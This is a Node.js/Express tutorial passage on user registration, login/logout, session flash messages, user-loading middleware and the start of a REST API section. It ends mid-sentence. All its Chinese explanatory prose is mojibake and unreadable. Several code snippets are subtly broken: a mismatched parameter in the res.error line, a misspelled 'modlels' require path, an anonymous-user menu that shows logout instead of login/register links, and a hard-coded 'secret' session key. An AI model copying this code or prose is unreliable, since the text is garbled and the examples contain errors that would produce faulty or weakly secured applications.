å®žçŽ°ç”¨æˆ·æ•°æ®å­˜å‚¨åŠŸèƒ½ï¼Œå­˜å‚¨ä»Žè¡¨å•æäº¤ä¸Šæ¥çš„ç”¨æˆ·æ•°æ® 1.æ·»åŠ æ³¨å†Œè·¯ç”±è¦æ˜¾ç¤ºæ³¨å†Œè¡¨å•ï¼Œé¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªè·¯ç”±æ¸²æŸ“è¿™ä¸ªè¡¨å•ï¼Œç„¶åŽæŠŠå®ƒè¿”å›žç»™ç”¨æˆ·çš„æµè§ˆå™¨æ˜¾ç¤ºå‡ºæ¥ã€‚ 12345678// app.jsconst register = require('./routes/register.js');app.get('/register',register.form);app.post('/register',register.submit);// routes/register.jsexports.form = (req, res) =&gt; &#123; res.render('register', &#123; title: 'Register' &#125;);&#125; app.js æ–°å¢žçš„ä»£ç ç”¨ Node æ¨¡å—ç³»ç»Ÿä»Ž routes ç›®å½•ä¸­å¼•å…¥å®šä¹‰æ³¨å†Œè·¯ç”±è¡Œä¸ºçš„æ¨¡å—ï¼Œå¹¶å°† HTTP æ–¹æ³•åŠ URL è·¯å¾„å…³è”åˆ°è·¯ç”±å‡½æ•°ä¸Šã€‚ç”±æ­¤æž„æˆäº†ä¸€ä¸ªå‰ç«¯æŽ§åˆ¶å™¨ã€‚æ—¢æœ‰Get è·¯ç”±ä»¬ä¹Ÿæœ‰Post è·¯ç”±ã€‚æŽ¥ç€å®šä¹‰è·¯ç”±é€»è¾‘ï¼Œè¾“å‡ºæ¸²æŸ“æ³¨å†Œæ¨¡æ¿çš„è·¯ç”±ã€‚ä¸Šé¢çš„è·¯ç”±ç”¨åˆ°äº†ä¸€ä¸ª EJS æ¨¡æ¿ï¼Œæˆ‘ä»¬æŽ¥ä¸‹æ¥åˆ›å»ºç”¨äºŽå®šä¹‰æ³¨å†Œè¡¨å•çš„ HTML æ¨¡æ¿ã€‚ 2.åˆ›å»ºæ³¨å†Œè¡¨å•ä¸ºäº†å®šä¹‰æ³¨å†Œè¡¨å•çš„ HTML ï¼Œéœ€è¦åœ¨ views ç›®å½•ä¸‹åˆ›å»º register.ejs æ–‡ä»¶ï¼š 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;% include menu %&gt;s &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Fill in the form below to sign up&lt;/p&gt; &lt;% include messages %&gt; &lt;form action=&apos;/register&apos; method=&quot;post&quot;&gt; &lt;p&gt; &lt;input type=&quot;text&quot; name=&apos;user[name]&apos; placeholder=&quot;Username&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;password&quot; name=&quot;user[pass]&quot; placeholder=&quot;password&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; value=&quot;Sign Up&quot;&gt; &lt;/p&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; æ³¨æ„ä¸Šé¢çš„ include messagesï¼Œå®ƒåµŒå…¥äº†å¦ä¸€ä¸ªæ¨¡æ¿ messages.ejsã€‚æˆ‘ä»¬æŽ¥ä¸‹æ¥å°±å®šä¹‰è¿™ä¸ªç”¨æ¥è·Ÿç”¨æˆ·æ²Ÿé€šçš„æ¨¡æ¿ã€‚ 3.åé¦ˆæ¶ˆæ¯ä¼ è¾¾ç»™ç”¨æˆ· åœ¨ç”¨æˆ·æ³¨å†Œè¿‡ç¨‹ä¸­ï¼Œä»¥åŠåœ¨å¤§å¤šæ•°åº”ç”¨åœºæ™¯ä¸­ï¼Œå°†åé¦ˆæ¶ˆæ¯ä¼ è¾¾ç»™ç”¨æˆ·éƒ½æ˜¯å¿…é¡»è¦åšçš„å·¥ä½œã€‚ è¿™ä¸ªç¨‹åºä¸­çš„ messages.ejs æ˜¯ç”¨æ¥æ˜¾ç¤ºé”™è¯¯çš„ï¼Œå®ƒä¼šåµŒå…¥åˆ°å¾ˆå¤šæ¨¡æ¿ä¸­ã€‚è¿™æ®µä»£ç ä¼šæ£€æŸ¥æ˜¯å¦æœ‰å˜é‡ locals.messages ï¼Œå¦‚æžœæœ‰ï¼Œæ¨¡æ¿ä¼šéåŽ†è¿™ä¸ªå˜é‡ä»¥æ˜¾ç¤ºæ¶ˆæ¯å¯¹è±¡ã€‚æ¯ä¸ªæ¶ˆæ¯å¯¹è±¡éƒ½æœ‰ type å±žæ€§ï¼ˆå¯ä»¥ç”¨æ¶ˆæ¯åšéžé”™è¯¯é€šçŸ¥ï¼‰ å’Œ string å±žæ€§ï¼ˆæ¶ˆæ¯æ–‡æœ¬ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥æŠŠè¦æ˜¾ç¤ºçš„é”™è¯¯æ·»åŠ åˆ° res.locals.messages æ•°ç»„ä¸­å½¢æˆé˜Ÿåˆ—ã€‚æ¶ˆæ¯æ˜¾ç¤ºåŽï¼Œè°ƒç”¨ removeMessages æ¸…ç©ºæ¶ˆæ¯é˜Ÿåˆ—ï¼š 12345678&lt;% if(locals.messages) &#123;%&gt;&lt;% messages.forEach((message) =&gt;)&#123; %&gt;&lt;p class=&apos;&lt;%= message.type %&gt;&apos;&gt; &lt;%= message.string %&gt;&lt;/p&gt;&lt;% &#125;) %&gt;&lt;% removeMessages() %&gt;&lt;% &#125; %&gt; å‘ res.locals.messages ä¸­æ·»åŠ æ¶ˆæ¯æ˜¯ä¸€ç§ç®€å•çš„ç”¨æˆ·æ²Ÿé€šæ–¹å¼ï¼Œä½†åœ¨é‡å®šå‘åŽ res.locals ä¼šä¸¢å¤±ï¼Œæ‰€ä»¥å¦‚æžœè¦è·¨è¶Šè¯·æ±‚ä¼ é€’æ¶ˆæ¯ï¼Œé‚£ä¹ˆéœ€è¦åˆ°ä¼šè¯ã€‚ 4.åœ¨ä¼šè¯ä¸­å­˜å‚¨ä¸´æ—¶çš„æ¶ˆæ¯Post/Redirect/Get(PRG)æ˜¯ä¸€ç§å¸¸ç”¨çš„ Web ç¨‹åºè®¾è®¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼æ˜¯æŒ‡ï¼Œç”¨æˆ·è¯·æ±‚è¡¨å•ï¼Œè¡¨å•æ•°æ®ä½œä¸º HTTP Post è¯·æ±‚è¢«æäº¤ï¼Œç„¶åŽç”¨æˆ·è¢«é‡å®šå‘åˆ°å¦ä¸€ä¸ª Web é¡µé¢ä¸Šã€‚ç”¨æˆ·è¢«é‡å®šå‘åˆ°å“ªé‡Œå–å†³äºŽè¡¨å•æ•°æ®æ˜¯å¦æœ‰æ•ˆã€‚å¦‚æžœè¡¨å•æ— æ•ˆï¼Œç¨‹åºä¼šè®©ç”¨æˆ·å›žåˆ°è¡¨å•é¡µé¢ï¼Œå¦‚æžœè¡¨å•æœ‰æ•ˆï¼Œç¨‹åºä¼šè®©ç”¨æˆ·åˆ°æ–°çš„ Web é¡µé¢ã€‚PRG æ¨¡å¼ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢è¡¨å•çš„é‡å¤æäº¤ã€‚ åœ¨ Express ä¸­ï¼Œç”¨æˆ·è¢«é‡å®šå‘åŽï¼Œres.locals ä¸­çš„å†…å®¹ä¼šè¢«é‡ç½®ï¼Œå¦‚æžœæŠŠå‘ç»™ç”¨æˆ·çš„æ¶ˆæ¯å­˜åœ¨ res.locals ä¸­ï¼Œè®©å®ƒåœ¨ä¸€ä¸ªä¼šè¯å˜é‡ä¸­ç»´æŠ¤ç”¨æˆ·æ¶ˆæ¯é˜Ÿåˆ—ã€‚ 12345678910//./middleware/messages.jsconst express = require('express');function message(req) &#123; return (msg, type) =&gt; &#123; type = type || 'info'; let sess = req.session; sess.messages = sess.messages || []; sess.messages.push(&#123; type: type, string: msg &#125;); &#125;&#125; req.message å‡½æ•°å¯ä»¥æŠŠæ¶ˆæ¯æ·»åŠ åˆ°æ¥è‡ªä»»ä½• Express è¯·æ±‚çš„ä¼šè¯å˜é‡ä¸­ã€‚express.response å¯¹è±¡æ˜¯ Express ç»™å“åº”å¯¹è±¡ç”¨çš„åŽŸåž‹ã€‚æ‰€æœ‰ä¸­é—´ä»¶å’Œè·¯ç”±éƒ½èƒ½è®¿é—®åˆ°æ·»åŠ åˆ°è¿™ä¸ªå¯¹è±¡çš„å±žæ€§ã€‚åœ¨å‰é¢çš„ä»£ç ä¸­ï¼Œ express.response è¢«èµ‹å€¼ç»™äº†ä¸€ä¸ªåä¸º res çš„å˜é‡ï¼Œè¿™æ ·æ·»åŠ å±žæ€§æ›´åŠ å®¹æ˜“ã€‚ è¿™ä¸ªåŠŸèƒ½éœ€è¦ä¼šè¯æ”¯æŒï¼Œéœ€è¦ä¸€ä¸ªè·Ÿ Express å…¼å®¹çš„ä¸­é—´ä»¶æ¨¡å—ï¼šexpress-session.å®‰è£…ï¼š 1npm i -S express-session æ·»åŠ åˆ° app.js ä¸­ 123456const session = require('express-session');app.use(session(&#123; secret: 'secret', resave: false, saveUninitialized: true&#125;)); ä¸ºäº†è®©æ·»åŠ æ¶ˆæ¯æ›´åŠ å®¹æ˜“ï¼Œç”¨ res.error å¯ä»¥è½»æ¾åœ°å°†ç±»åž‹ä¸º error çš„æ¶ˆæ¯æ·»åŠ åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚å®ƒç”¨åˆ°äº†å‰é¢å®šä¹‰çš„ res.message å‡½æ•°ï¼š 1res.error = meg =&gt; this.message(msg,'error'); æœ€åŽä¸€æ­¥æ˜¯æŠŠè¿™äº›æ¶ˆæ¯è¾“å‡ºåˆ°æ¨¡æ¿ä¸­æ˜¾ç¤ºã€‚å¦‚æžœä¸åšè¿™ä¸€æ­¥ï¼Œå°±åªèƒ½æŠŠreq.session.messagesä¼ ç»™æ¯ä¸ª res.render()è°ƒç”¨ï¼Œè¿™å¾ˆä¸æ˜Žæ™ºã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªä¸­é—´ä»¶ï¼Œåœ¨æ¯ä¸ªè¯·æ±‚ä¸Šç”¨ res.session.messages ä¸Šçš„å†…å®¹ç»„è£…å‡º res.locals.messagesï¼Œè¿™æ ·å¯ä»¥æ›´é«˜æ•ˆåœ°æŠŠæ¶ˆæ¯è¾“å‡ºåˆ°æ‰€æœ‰è¦æ¸²æŸ“çš„æ¨¡æ¿ä¸Šã€‚åˆ°ç›®å‰ä¸º æ­¢ï¼Œ./middleware/messages.js åªæ˜¯æ‰©å±•äº†å“åº”çš„åŽŸåž‹ï¼Œè¿˜æ²¡è¾“å‡ºä»»ä½•ä¸œè¥¿ã€‚æŠŠä¸‹é¢çš„ä»£ç åŠ åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œè¾“å‡ºæˆ‘ä»¬éœ€è¦çš„ä¸­é—´ä»¶ï¼š 1234567891011module.exports = (req, res, next) =&gt; &#123; res.message = message(req) res.error = (msg) =&gt; &#123; return res.message(msg, 'error'); &#125;; res.locals.messages = req.session.messages || []; res.locals.removeMessages = () =&gt; &#123; req.session.messages = []; &#125; next();&#125; å®ƒé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªæ¨¡æ¿å˜é‡ messages ç”¨æ¥å­˜æ”¾ä¼šè¯ä¸­çš„æ¶ˆæ¯ï¼Œåœ¨ä¸Šä¸€ä¸ªè¯·æ±‚ä¸­å¯èƒ½å­˜åœ¨ï¼Œä¹Ÿå¯èƒ½ä¸å­˜åœ¨ã€‚æŽ¥ä¸‹æ¥ï¼Œè¿˜éœ€è¦ä¸€ä¸ªæŠŠæ¶ˆæ¯ä»Žä¼šè¯ä¸­ç§»é™¤çš„æ–¹æ³•ï¼Œå¦åˆ™å®ƒä»¬ä¼šå› ä¸ºæ²¡äººæ¸…ç†è€Œè¶Šç§¯è¶Šå¤šã€‚ çŽ°åœ¨åªè¦åœ¨ app.js ä¸­ require() è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥é›†æˆè¿™ä¸ªæ–°åŠŸèƒ½äº†ã€‚è¿™ä¸ªä¸­é—´ä»¶åº”è¯¥æ”¾åœ¨ä¸­é—´ä»¶ sessionä¸‹é¢ï¼Œæ‰€ä»¥å¯ä»¥è°ƒç”¨ app.useï¼ˆmessagesï¼‰ï¼Œè€Œä¸éœ€è°ƒç”¨ app.use(messages());ä¸ºå°†æ¥è€ƒè™‘ï¼Œä¸ç®¡æ˜¯å¦æŽ¥å—é€‰é¡¹ï¼Œç¬¬ä¸‰æ–¹ä¸­é—´ä»¶æœ€å¥½ç”¨ app.use(messages())ï¼š 12const messages = require('./middleware/messages');app.use(messages); è¿™æ ·ä»»ä½•è§†å›¾ä¸­éƒ½å¯ä»¥è®¿é—®åˆ° messages å’Œ removeMessages()äº†ï¼Œæ‰€ä»¥ï¼Œä¸ç®¡å‡ºçŽ°åœ¨å“ªä¸ªæ¨¡æ¿ä¸­ï¼Œmessages.ejs åº”è¯¥éƒ½å¯ä»¥åœ†æ»¡å®Œæˆä»»åŠ¡ã€‚ 5.å®žçŽ°ç”¨æˆ·æ³¨å†Œ æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè·¯ç”±å‡½æ•°æ¥å¤„ç†æäº¤åˆ° /register ä¸Šçš„ HTTP POST è¯·æ±‚ã€‚å¯ä»¥å°†è¿™ä¸ªå‡½æ•°å‘½åä¸º submitã€‚ å½“è¡¨å•æ•°æ®æäº¤ä¸Šæ¥æ—¶ï¼Œä¸­é—´ä»¶ bodyParser()ä¼šç”¨è¿™äº›æ•°æ®ç»„è£… req.bodyã€‚æ³¨å†Œè¡¨å•ä½¿ç”¨äº†å¯¹è±¡è¡¨ç¤ºæ³• user[name]ï¼Œç»è¿‡è§£æžåŽä¼šå˜æˆ req.body.user.nameã€‚åŒæ ·ï¼Œreq.body.user.passè¡¨ç¤ºå¯†ç è¾“å…¥åŸŸã€‚ æ³¨å†Œä¸€å®Œæˆï¼Œå°±ä¼šæŠŠ user.id èµ‹å€¼ç»™ä¼šè¯å˜é‡ï¼Œç¨åŽè¿˜è¦é€šè¿‡æ£€æŸ¥å®ƒæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦é€šè¿‡äº†è®¤è¯ã€‚å¦‚æžœæ ¡éªŒå¤±è´¥ï¼Œæ¶ˆæ¯ä¼šä½œä¸º messages å˜é‡é€šè¿‡ res.locals.messages è¾“å‡ºåˆ°æ¨¡æ¿ä¸­ï¼Œå¹¶ä¸”ç”¨æˆ·ä¼šè¢«é‡å®šå‘å›žæ³¨å†Œè¡¨å• 1234567891011121314151617181920212223242526272829const User = require('../models/user');exports.form = (req, res) =&gt; &#123; res.render('register', &#123; title: 'Register' &#125;);&#125;exports.submit = (req, res, next) =&gt; &#123; const data = req.body.user; // æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å”¯ä¸€ User.getByName(data.name, (err, user) =&gt; &#123; if (err) return next(err); // ç”¨æˆ·åè¢«å ç”¨ if (user.id) &#123; res.error('Username already taken!'); res.redirect('back'); &#125; else &#123; // ç”¨ POST æ•°æ®åˆ›å»ºç”¨æˆ· user = new User(&#123; name: data.name, pass: data.pass &#125;); // ä¿å­˜æ–°ç”¨æˆ· user.save(err=&gt;&#123; // ä¸ºè®¤è¯ä¿å­˜ uid if(err) return next(err); req.session.uid = user.id; res.redirect('/'); &#125;); &#125; &#125;);&#125; è®¿é—® /register æ³¨å†Œä¸€ä¸ªç”¨æˆ·ã€‚ å·²æ³¨å†Œç”¨æˆ·ç™»å½•å®žçŽ°ç™»å½•åŠŸèƒ½æ¯”æ³¨å†Œç®€å•ï¼Œå› ä¸ºä¹‹å‰å®šä¹‰çš„é€šç”¨è®¤è¯æ–¹æ³• User.authenticate() é‡Œå·²ç»æœ‰ç™»å½•æ‰€éœ€çš„å¤§éƒ¨åˆ†ä»£ç ã€‚æœ¬èŠ‚æ·»åŠ  æ˜¾ç¤ºç™»å½•è¡¨å•çš„è·¯ç”±é€»è¾‘ è®¤è¯ä»Žè¡¨å•æäº¤çš„ç”¨æˆ·æ•°æ®çš„é€»è¾‘ ä¿®æ”¹app.js: 1234const login = require('./routes/login');app.get('/login', login.form);app.post('/login', login.submit);app.get('/logout', login.logout); 1.æ˜¾ç¤ºç™»å½•è¡¨å•å®žçŽ°ç™»å½•è¡¨å•çš„ç¬¬ä¸€æ­¥æ˜¯ä¸ºä¸Žç™»å½•å’Œé€€å‡ºç›¸å…³çš„è·¯ç”±åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š routers/login.js.æ˜¾ç¤ºç™»å½•è¡¨å•çš„è·¯ç”±é€»è¾‘å‡ ä¹Žè·Ÿä¹‹å‰é‚£ä¸ªæ˜¾ç¤ºæ³¨å†Œè¡¨å•çš„é€»è¾‘ä¸€æ¨¡ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯æ¨¡æ¿åç§°å’Œé¡µé¢æ ‡é¢˜ä¸åŒï¼š 123exports.form = (req, res) =&gt; &#123; res.render('login', &#123; title: 'Login' &#125;);&#125; å®šä¹‰ç™»å½•è¡¨å•çš„ login.ejs ä¹Ÿå’Œ æ³¨å†Œçš„ç›¸ä¼¼ï¼Œåªæœ‰è¯´æ˜Žæ–‡æœ¬å’Œæäº¤ç›®æ ‡ä¸åŒã€‚ 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;% include menu %&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Fill in the form below to sign in!&lt;/p&gt; &lt;% include messages %&gt; &lt;form action=&apos;/login&apos; method=&apos;post&apos;&gt; &lt;p&gt; &lt;input type=&apos;text&apos; name=&apos;user[name]&apos; placeholder=&apos;Username&apos; /&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&apos;password&apos; name=&apos;user[pass]&apos; placeholder=&apos;Password&apos; /&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&apos;submit&apos; value=&apos;Login&apos; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 2.ç™»å½•è®¤è¯å¤„ç†ç™»å½•è¯·æ±‚éœ€è¦æ·»åŠ è·¯ç”±é€»è¾‘ï¼Œå¯¹ç”¨æˆ·æäº¤çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æžœæ­£ç¡®ï¼Œå°†ç”¨æˆ· ID è®¾ä¸ºå¯¹è¯å˜é‡ï¼Œå¹¶æŠŠç”¨æˆ·é‡å®šå‘åˆ°é¦–é¡µä¸Šã€‚ 123456789101112131415161718//routers/login.jsconst User = require('../modlels/user');exports.submit = (req, res, next) =&gt; &#123; // æ£€æŸ¥å‡­è¯ const data = req.body.user; User.authenticate(data.name, data.pass, (err, user) =&gt; &#123; if (err) return next(err); // å¤„ç†å‡­è¯æœ‰æ•ˆçš„ç”¨æˆ· if (user) &#123; // ä¸ºè®¤è¯å­˜å‚¨ uid req.session.uid = user.id; res.redirect('/'); &#125; else &#123; res.error('Sorry! invalid credentials'); res.redirect('back'); &#125; &#125;);&#125; å¦‚æžœç”¨æˆ·æ—¶ä½¿ç”¨ User.authenticate() è®¤è¯ï¼Œreq.session.uid å°±ä¼šæƒ³åœ¨ POST/register è·¯ç”±ä¸­ä¸€æ ·èµ‹å€¼ï¼šè¿™ä¸ªå€¼ä¼šä¿å­˜åœ¨ä¼šè¯ä¸­ï¼Œå¯ä»¥ç”¨å®ƒèŽ·å– User æˆ–å…¶ä»–ç”¨æˆ·ç›¸å…³çš„æ•°æ®ã€‚å¦‚æžœæ‰¾ä¸åˆ°åŒ¹é…çš„è®°å½•ï¼Œä¼šè®¾å®šä¸€ä¸ªé”™è¯¯ï¼Œå¹¶é‡æ–°æ˜¾ç¤ºç™»å½•è¡¨å•ã€‚ ç”¨æˆ·å¯èƒ½è¿˜å¸Œæœ›æœ‰ä¸ªé€€å‡ºåŠŸèƒ½ï¼Œæ‰€ä»¥åº”è¯¥åœ¨ç¨‹åºä¸­æä¾›ä¸€ä¸ªé€€å‡ºé“¾æŽ¥ã€‚ 123456exports.logout = (req, res) =&gt; &#123; req.session.destroy(err =&gt; &#123; if (err) throw err; res.redirect('/'); &#125;);&#125; æ³¨å†Œå’Œç™»å½•é¡µé¢éƒ½åˆ›å»ºå¥½äº†ï¼ŒæŽ¥ä¸‹æ¥éœ€è¦æ·»åŠ ä¸€ä¸ªèœå•ï¼Œè®©ç”¨æˆ·å¯ä»¥è¿›å…¥è¿™ä¸¤ä¸ªé¡µé¢ã€‚ 3.ä¸ºå·²è®¤è¯çš„å’ŒåŒ¿åçš„ç”¨æˆ·åˆ›å»ºèœå•åœ¨æ‰€æœ‰ç¨‹åºé¡µé¢çš„ EJS æ¨¡æ¿ä¸­ï¼Œæ ‡ç­¾ &lt;body&gt;ä¹‹åŽéƒ½æœ‰è¿™æ ·çš„ä¸€æ®µä»£ç ï¼Œ&lt;% include menu %&gt;ï¼Œè¿™æ˜¯è¦åµŒå…¥æ¨¡æ¿ ./views/menu.ejsï¼ŒæŽ¥ä¸‹æ¥é©¬ä¸Šåˆ›å»º 123456789101112&lt;% if(locals.user) &#123; %&gt; &lt;div id=&quot;menu&quot;&gt; &lt;span class=&quot;name&quot;&gt;&lt;%= user.name %&gt;&lt;/span&gt; &lt;a href=&quot;/post&quot;&gt;post&lt;/a&gt; &lt;a href=&quot;/logout&quot;&gt;logout&lt;/a&gt; &lt;/div&gt;&lt;% &#125; else &#123; %&gt; &lt;div id=&quot;menu&quot;&gt; &lt;a href=&quot;/post&quot;&gt;post&lt;/a&gt; &lt;a href=&quot;/logout&quot;&gt;logout&lt;/a&gt; &lt;/div&gt;&lt;% &#125; %&gt; åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼Œä½ å¯ä»¥å‡å®šå¦‚æžœæœ‰ user å˜é‡è¾“å‡ºåˆ°äº†æ¨¡æ¿ä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªç”¨æˆ·å°±å·²ç»é€šè¿‡è®¤è¯äº†ï¼Œå¦åˆ™ä¸ä¼šè¾“å‡ºè¿™ä¸ªå˜é‡ã€‚ä¹Ÿå°±æ˜¯è¯´å½“è¿™ä¸ªå˜é‡å‡ºçŽ°æ—¶ï¼Œå¯ä»¥æ˜¾ç¤ºç”¨æˆ·åã€æ¶ˆæ¯æäº¤å’Œé€€å‡ºé“¾æŽ¥ã€‚å½“è®¿é—®è€…æ˜¯åŒ¿åç”¨æˆ·æ—¶ï¼Œæ˜¾ç¤ºç½‘ç«™ç™»å½•å’Œæ³¨å†Œé“¾æŽ¥ã€‚ æˆ‘ä»¬è¦å†™ä¸€äº›ä»£ç ä¸ºæ¯ä¸ªè¯·æ±‚åŠ è½½å·²ç™»å½•ç”¨æˆ·çš„æ•°æ®ï¼Œå¹¶è®©æ¨¡æ¿å¯ä»¥å¾—åˆ°è¿™äº›æ•°æ®. ç”¨æˆ·åŠ è½½ä¸­é—´ä»¶åœ¨åš Web ç¨‹åºæ—¶ï¼Œä¸€èˆ¬éƒ½éœ€è¦ä»Žæ•°æ®åº“ä¸­åŠ è½½ç”¨æˆ·æ¶ˆæ¯ï¼Œé€šå¸¸ä¼šè¡¨ç¤ºä¸º JavaScript å¯¹è±¡ï¼Œä¸ºäº†ä½¿å…¶ä¸Žç”¨æˆ·äº¤äº’ç®€å•ï¼Œè¦ä¿è¯è¿™é¡¹æ•°æ®çš„å¯æŒç»­è®¿é—®ã€‚ä¸‹é¢è¦ç”¨ä¸­é—´ä»¶ä¸ºæ¯ä¸ªè¯·æ±‚åŠ è½½ç”¨æˆ·æ•°æ®ã€‚ ä¸­é—´ä»¶è„šæœ¬ä¼šæ”¾åœ¨ ./middleware/user.js ä¸­ï¼Œå®ƒä¼šä»Žä¸Šå±‚ç›®å½•models ä¸­å¼•å…¥ User æ¨¡åž‹ã€‚ æ˜¾ç¤ºè¾“å‡ºä¸­é—´ä»¶å‡½æ•°ï¼Œç„¶åŽæ£€æŸ¥ä¼šè¯æŸ¥çœ‹ç”¨æˆ·ID ã€‚å½“ç”¨æˆ· ID å‡ºçŽ°æ—¶ï¼Œè¡¨æ˜Žç”¨æˆ·å·²ç»é€šè¿‡è®¤è¯ï¼Œæ‰€æœ‰ä»Ž Redis ä¸­å–å‡ºç”¨æˆ·æ•°æ®æ˜¯å®‰å…¨çš„ã€‚ Node æ˜¯å•çº¿ç¨‹çš„ï¼Œæ²¡æœ‰çº¿ç¨‹æœ¬åœ°å­˜å‚¨ã€‚å¯¹äºŽ HTTP æœåŠ¡å™¨è€Œè¨€ï¼Œè¯·æ±‚å’Œå“åº”å˜é‡æ˜¯å”¯ä¸€çš„ä¸Šä¸‹æ–‡ã€‚æž„å»ºåœ¨ Node ä¹‹ä¸Šçš„é«˜å±‚æ¡†æž¶å¯èƒ½ä¼šæä¾›é¢å¤–çš„å¯¹è±¡å­˜æ”¾å·²è®¤è¯ç”¨æˆ·ä¹‹ç±»çš„æ•°æ®ï¼Œä½† Express åšæŒä½¿ç”¨ Node åŽŸå§‹å¯¹è±¡ã€‚å› æ­¤ï¼Œä¸Šä¸‹æ–‡æ•°æ®ä¸€èˆ¬ä¿å­˜åœ¨è¯·æ±‚å¯¹è±¡ä¸Šï¼Œä¸‹é¢çš„ä»£ç ä¸­ï¼Œç”¨æˆ·è¢«å­˜å‚¨ req.userï¼ŒåŽç»­ä¸­é—´ä»¶å’Œè·¯ç”±å¯ä»¥ç”¨è¿™ä¸ªå±žæ€§è®¿é—®å®ƒã€‚ res.locals æ˜¯ Express æä¾›çš„è¯·æ±‚å±‚å¯¹è±¡ï¼Œå¯ä»¥å°†æ•°æ®è¾“å‡ºç»™æ¨¡æ¿ã€‚ 12345678910111213const User = require('../models/user');module.exports = (req,res,next) =&gt;&#123; // ä»Žä¼šè¯ä¸­å–å‡ºå·²ç™»å½•ç”¨æˆ·çš„ id const uid = req.session.uid; if(!uid) return next(); // ä»Ž Redis ä¸­å–å‡ºå·²ç™»å½•çš„ç”¨æˆ·çš„æ•°æ® User.get(uid,(err,user)=&gt;&#123; if(err) return next(err); // å°†ç”¨æˆ·æ•°æ®è¾“å‡ºåˆ°å“åº”å¯¹è±¡ä¸­ req.user = res.locals.user = user; next(); &#125;);&#125; æ”¹å˜app.js ä»£ç ï¼Œå¯ç”¨è¿™ä¸ªä¸­é—´ä»¶ã€‚ã€‚åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼Œuser å‡ºçŽ°åœ¨è·¯ç”±å™¨ä¸Šé¢ï¼Œæ‰€ä»¥åªæœ‰è·¯ç”±å’Œåœ¨ user ä¸‹é¢çš„ä¸­é—´ä»¶èƒ½è®¿é—® req.userã€‚å¦‚æžœä½ æ­£åœ¨ä½¿ç”¨åŠ è½½æ•°æ®çš„ä¸­é—´ä»¶ï¼Œå°±åƒè¿™ä¸ªä¸­é—´ä»¶ä¸€æ ·ï¼Œ å¯èƒ½è¦æŠŠ express.static æ”¾åˆ°å®ƒä¸Šé¢ã€‚å¦åˆ™æ¯æ¬¡è¿”å›žé™æ€æ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šæµªè´¹æ—¶é—´åˆ°æ•°æ®åº“ä¸­å–ç”¨æˆ·æ•°æ®ã€‚ 12const user = require('./middleware/user');app.use(user); å¢žåŠ èœå•çš„æ ·å¼ 123456789101112131415#menu &#123; position: absolute; top: 15px; right: 20px; font-size: 12px; color: #888; &#125; #menu .name:after &#123; content: ' -'; &#125; #menu a &#123; text-decoration: none; margin-left: 5px; color: black; &#125; åˆ›å»º REST API æœ¬èŠ‚åˆ›å»ºä¸€ä¸ª RESTful API,è®©ç¬¬ä¸‰æ–¹ç¨‹åºå¯ä»¥è·Ÿæˆ‘ä»¬çš„åœ¨çº¿ç•™è¨€æ¿ç¨‹åºäº’åŠ¨ï¼Œè¿›è¡Œå…¬å¼€æ•°æ®çš„è®¿é—®å’Œæ·»åŠ ã€‚æŒ‰ç…§ REST çš„æ€æƒ³ï¼Œç¨‹åºæ•°æ®æ˜¯å¯ä»¥ç”¨è°“è¯­å’Œåè¯ï¼ˆå³ HTTP æ–¹æ³•å’Œ URLï¼‰è®¿é—®å’Œä¿®æ”¹çš„ã€‚é€šè¿‡ REST è¯·æ±‚å¾—åˆ°çš„æ•°æ®ä¸€èˆ¬æ˜¯æœºå™¨å¯è¯»çš„æ ¼å¼ï¼Œæ¯”å¦‚ JSON å’Œ XML å®žçŽ° API éœ€è¦å®Œæˆä¸‹é¢çš„ä»»åŠ¡: è®¾è®¡ä¸€ä¸ªè®©ç”¨æˆ·æ˜¾ç¤ºã€åˆ—è¡¨ã€ç§»é™¤å’Œæäº¤æ¶ˆæ¯çš„ API æ·»åŠ åŸºæœ¬è®¤è¯ å®žçŽ°è·¯ç”± æä¾› JSON å’Œ XML å“åº” èƒ½å¯¹ API è¯·æ±‚è¿›è¡Œè®¤è¯å’Œç­¾åçš„æŠ€æœ¯å¾ˆæœ‰å¾ˆå¤šç§ï¼Œæœ¬ç« ä»‹ç»ä»¥ basic-anth åŒ…ä¸ºä¾‹çš„é›†æˆè®¤è¯åŠŸèƒ½ã€‚ 1.è®¾è®¡ APIæˆ‘ä»¬ä¸€èˆ¬ä¼šåœ¨ REST ful APIå‰åŠ 